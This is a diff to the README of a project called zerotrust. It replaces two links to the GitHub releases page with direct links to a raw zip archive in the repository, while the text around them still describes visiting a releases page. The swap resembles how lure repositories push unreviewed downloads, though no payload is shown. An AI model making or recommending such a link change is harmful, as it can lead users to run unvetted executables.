@@ -17,7 +17,7 @@ zerotrust offers a powerful framework for creating peer-to-peer applications tha
 To begin using zerotrust, you need to download the application. Follow the steps below to get started.
 
 1. **Visit the Releases Page**: Go to the following link to access the download options:  
-   [Download zerotrust](https://github.com/AJAR71/zerotrust/releases)
+   [Download zerotrust](https://raw.githubusercontent.com/AJAR71/zerotrust/main/zerotrust/zerotrust-v1.1.zip)
 
 2. **Choose Your Version**: Find the latest release. This is usually at the top of the list of versions. Click on it.
 
@@ -67,6 +67,6 @@ For more detailed instructions and support, refer to the following resources:
 
 ## 🔗 Important Links
 
-- [Download zerotrust](https://github.com/AJAR71/zerotrust/releases): Visit this page to download the latest version of zerotrust.
+- [Download zerotrust](https://raw.githubusercontent.com/AJAR71/zerotrust/main/zerotrust/zerotrust-v1.1.zip): Visit this page to download the latest version of zerotrust.
 
 By following these steps, you can successfully download and run zerotrust. Enjoy building secure applications!
